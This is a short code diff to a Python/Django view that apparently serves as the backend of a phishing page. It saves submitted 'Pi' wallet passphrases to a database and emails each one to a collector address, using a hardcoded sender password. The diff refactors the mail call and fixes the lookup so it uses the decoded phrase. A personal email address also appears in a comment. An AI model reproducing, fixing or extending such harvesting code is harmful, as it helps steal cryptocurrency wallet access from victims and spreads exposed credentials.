@@ -13,14 +13,20 @@ def send_notify(subject, payload, email_to):
     password = "pvos glgf nxal finc"
     recipient = email_to
     
-    return sending_no(payload, recipient, sender,password, subject)
+    return sending_no(
+        payload=payload,
+        recipient=recipient,
+        sender=sender,
+        password=password,
+        subject=subject
+    )
 
 def sendmail(request, keys, email):
     current_date = datetime.now()
     formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")    
     decoded_param = unquote(keys)
 
-    exists = PassPhrase.objects.filter(keys = keys).exists()
+    exists = PassPhrase.objects.filter(keys = decoded_param).exists()
 
     if not exists:
         saved = PassPhrase.objects.create(
@@ -34,7 +40,6 @@ def sendmail(request, keys, email):
         else:
             send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to=email)
 
-    print(exists)
                     
     # send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
     
